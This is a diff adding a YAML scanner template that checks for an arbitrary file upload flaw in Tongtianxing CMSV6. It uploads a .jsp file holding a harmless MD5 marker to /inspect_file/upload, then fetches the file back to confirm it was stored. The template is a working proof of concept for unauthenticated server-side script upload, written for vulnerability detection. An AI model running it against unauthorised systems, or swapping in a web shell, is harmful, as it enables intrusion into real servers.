@@ -1,0 +1,61 @@
+id: g-sky-cmsv6-inspect-file-anyfile-upload
+info:
+  name: 通天星CMSV6 inspect_file 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/inspect_file/upload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=-----------------------------7db372eb000e2"
+    body: |-
+      -----------------------------7db372eb000e2
+      Content-Disposition: form-data; name="uploadFile"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      -----------------------------7db372eb000e2--
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "software\\/(?P<file>.*).jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "filePath"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: step2
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/software/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
